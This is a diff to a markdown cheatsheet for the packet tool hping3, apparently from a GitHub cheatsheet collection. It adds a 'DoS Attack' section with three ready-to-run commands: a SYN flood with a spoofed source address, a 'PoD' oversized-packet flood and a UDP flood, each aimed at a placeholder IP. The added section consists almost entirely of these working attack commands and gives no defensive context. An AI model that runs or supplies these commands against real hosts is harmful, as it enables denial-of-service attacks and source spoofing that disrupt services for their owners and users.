@@ -50,6 +50,24 @@ hping3 [IP-Address] --udp --ran-source --data 500
 ```
 hping3 [IP-Address] --flood
 ```
+
+### DoS Attack
+
+#### *SYN Flooding*
+```
+hping3 -S [IP-Address] -a [Spoofable-IP-Address] -p 22 --flood
+```
+
+#### *PoD Attack*
+```
+hping3 -d 65538 -S -p 21 --flood [IP-Address]
+```
+
+#### *UDP Flood Attack*
+```
+hping3 -2 -p 139 --flood [IP-Address]
+```
+
 ---
 
 [:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)
